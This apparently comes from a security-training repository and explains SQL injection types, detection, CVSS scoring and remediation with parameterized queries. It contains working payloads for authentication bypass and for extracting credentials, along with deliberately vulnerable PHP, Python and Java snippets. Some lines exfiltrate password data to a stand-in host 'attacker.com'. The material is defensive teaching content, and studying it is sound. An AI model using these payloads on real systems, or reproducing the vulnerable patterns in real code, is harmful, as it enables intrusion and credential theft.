# SQL Injection (SQLi)

## Introduction

SQL Injection is a critical web security vulnerability that allows attackers to interfere with database queries. By injecting malicious SQL code into application inputs, attackers can bypass authentication, retrieve sensitive data, modify or delete records, and even execute administrative operations on the database.

## Table of Contents

- [Types of SQL Injection](#types-of-sql-injection)
- [Vulnerability Examples](#vulnerability-examples)
- [Business Impact](#business-impact)
- [Detection Methods](#detection-methods)
- [Risk Assessment](#risk-assessment)
- [Remediation](#remediation)
- [Additional Resources](#additional-resources)

## Types of SQL Injection

### 1. In-Band SQLi (Classic)

#### Error-Based SQLi
Exploits database error messages to extract information about the database structure.

**Example:**
```sql
' OR 1=1--
' UNION SELECT NULL, table_name FROM information_schema.tables--
```

#### Union-Based SQLi
Uses UNION operator to combine malicious query results with legitimate ones.

**Example:**
```sql
' UNION SELECT username, password FROM users--
' UNION SELECT NULL, version()--
```

### 2. Blind SQLi

#### Boolean-Based Blind SQLi
Observes application behavior (true/false responses) to infer data.

**Example:**
```sql
' AND 1=1-- (true)
' AND 1=2-- (false)
' AND SUBSTRING(database(),1,1)='a'--
```

#### Time-Based Blind SQLi
Uses database sleep functions to infer data through response delays.

**Example:**
```sql
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
' AND IF(1=1, SLEEP(5), 0)--
```

### 3. Out-of-Band SQLi

Uses alternative channels (DNS, HTTP) to exfiltrate data when in-band techniques fail.

**Example:**
```sql
'; EXEC xp_dirtree '//attacker.com/share'--
' UNION SELECT load_file(CONCAT('\\\\',(SELECT password FROM users),'.attacker.com\\file'))--
```

### 4. Second-Order SQLi

Malicious input is stored and later executed in a different context.

## Vulnerability Examples

### Example 1: Authentication Bypass

**Vulnerable Code (PHP):**
```php
<?php
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);

if(mysqli_num_rows($result) > 0) {
    // Login successful
    $_SESSION['logged_in'] = true;
}
?>
```

**Attack Payload:**
```
username: admin'--
password: anything
```

**Resulting Query:**
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

### Example 2: Data Extraction

**Vulnerable Code (Python):**
```python
user_id = request.args.get('id')
query = f"SELECT * FROM products WHERE id = {user_id}"
cursor.execute(query)
```

**Attack Payload:**
```
id=1 UNION SELECT username,password,email,NULL,NULL FROM users--
```

**Resulting Query:**
```sql
SELECT * FROM products WHERE id = 1 UNION SELECT username,password,email,NULL,NULL FROM users--
```

### Example 3: Time-Based Blind SQLi

**Vulnerable Code (Java):**
```java
String query = "SELECT * FROM articles WHERE id = " + request.getParameter("id");
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

**Attack Payload:**
```
id=1 AND IF(SUBSTRING(database(),1,1)='t', SLEEP(5), 0)
```

## Business Impact

### Critical Risks:

1. **Data Breach**: Unauthorized access to sensitive customer data, financial records, and personal information
2. **Authentication Bypass**: Complete takeover of user accounts including administrative accounts
3. **Data Manipulation**: Modification or deletion of critical business data
4. **Compliance Violations**: GDPR, PCI-DSS, HIPAA violations leading to heavy fines
5. **Reputation Damage**: Loss of customer trust and brand value
6. **Financial Loss**: Direct financial theft, ransom demands, legal costs
7. **System Compromise**: Potential for remote code execution and server takeover

### Real-World Examples:

- **TalkTalk (2015)**: 157,000 customer records stolen via SQLi, £400,000 fine
- **Yahoo (2012)**: 450,000 credentials exposed through SQL injection
- **Heartland Payment Systems (2008)**: 130 million credit cards compromised

## Detection Methods

### Manual Testing

1. **Input Validation Testing**:
   - Single quote: `'`
   - Double quote: `"`
   - SQL comments: `--`, `#`, `/**/`
   - Boolean operators: `' OR '1'='1`
   - Time delays: `'; WAITFOR DELAY '00:00:05'--`

2. **Error Message Analysis**:
   - Trigger database errors
   - Analyze error messages for database type and structure

3. **Response Analysis**:
   - Compare responses for true/false conditions
   - Measure response time differences

### Automated Tools

- **SQLMap**: Automated SQL injection detection and exploitation
- **Burp Suite Scanner**: Comprehensive vulnerability scanner
- **OWASP ZAP**: Open-source security testing tool
- **Havij**: Automated SQL injection tool
- **NoSQLMap**: For NoSQL injection testing

### Code Review Indicators

```python
# Vulnerable patterns:
- String concatenation in queries
- Direct user input in SQL statements
- Lack of parameterized queries
- Insufficient input validation
```

## Risk Assessment

### CVSS v3.1 Score: 9.8 (CRITICAL)

**Vector String**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

### Risk Breakdown:

- **Attack Vector**: Network (AV:N)
- **Attack Complexity**: Low (AC:L)
- **Privileges Required**: None (PR:N)
- **User Interaction**: None (UI:N)
- **Confidentiality Impact**: High (C:H)
- **Integrity Impact**: High (I:H)
- **Availability Impact**: High (A:H)

### OWASP Top 10: A03:2021 – Injection

### CWE Classification:
- CWE-89: SQL Injection
- CWE-564: SQL Injection: Hibernate
- CWE-943: Improper Neutralization of Special Elements in Data Query Logic

## Remediation

### Primary Defenses

#### 1. Parameterized Queries (Prepared Statements)

**Secure Code (PHP):**
```php
<?php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
?>
```

**Secure Code (Python):**
```python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

**Secure Code (Java):**
```java
PreparedStatement pstmt = connection.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

#### 2. Stored Procedures (When Properly Used)

**Secure Code (SQL Server):**
```sql
CREATE PROCEDURE GetUser
    @Username NVARCHAR(50),
    @Password NVARCHAR(50)
AS
BEGIN
    SELECT * FROM Users WHERE Username = @Username AND Password = @Password
END
```

#### 3. Input Validation and Sanitization

**Whitelist Validation (Python):**
```python
import re

def validate_user_id(user_id):
    if not re.match(r'^[0-9]+$', user_id):
        raise ValueError("Invalid user ID")
    return int(user_id)

user_id = validate_user_id(request.args.get('id'))
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_id,))
```

#### 4. Escaping User Input

**Note**: This is a secondary defense and should NOT be relied upon as primary protection.

```php
$username = mysqli_real_escape_string($conn, $_POST['username']);
```

### Additional Security Measures

1. **Least Privilege Principle**:
   - Database accounts should have minimal necessary permissions
   - Separate read-only and write accounts
   - Never use 'sa' or 'root' for application connections

2. **Web Application Firewall (WAF)**:
   - Deploy ModSecurity or commercial WAF
   - Configure rules to block common SQLi patterns

3. **Error Handling**:
   - Suppress detailed database errors in production
   - Log errors securely for debugging
   - Return generic error messages to users

```php
// Secure error handling
try {
    $stmt->execute();
} catch (Exception $e) {
    error_log($e->getMessage()); // Log for admins
    die("An error occurred. Please try again."); // Generic message for users
}
```

4. **Regular Security Audits**:
   - Conduct penetration testing
   - Perform code reviews
   - Use static analysis tools

5. **Database Security**:
   - Keep database software updated
   - Use strong authentication
   - Encrypt sensitive data
   - Enable database auditing

### ORM Frameworks (Additional Layer)

While ORMs help, they don't eliminate SQLi risk entirely:

**Secure ORM Usage (Django):**
```python
# Safe
User.objects.filter(username=username)

# Unsafe - raw queries
User.objects.raw("SELECT * FROM users WHERE username = '" + username + "'")

# Safe raw query
User.objects.raw("SELECT * FROM users WHERE username = %s", [username])
```

## Additional Resources

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

## Related Modules

- [Payloads.md](./Payloads.md) - Comprehensive SQLi payload collection
- [Remediation.md](./Remediation.md) - Detailed secure coding guidelines
- [Reproduce.md](./Reproduce.md) - Step-by-step attack reproduction
- [BurpSuite-Guide.md](./BurpSuite-Guide.md) - Burp Suite testing methodology

---

**Last Updated**: October 2025  
**Severity**: Critical  
**OWASP Top 10**: A03:2021
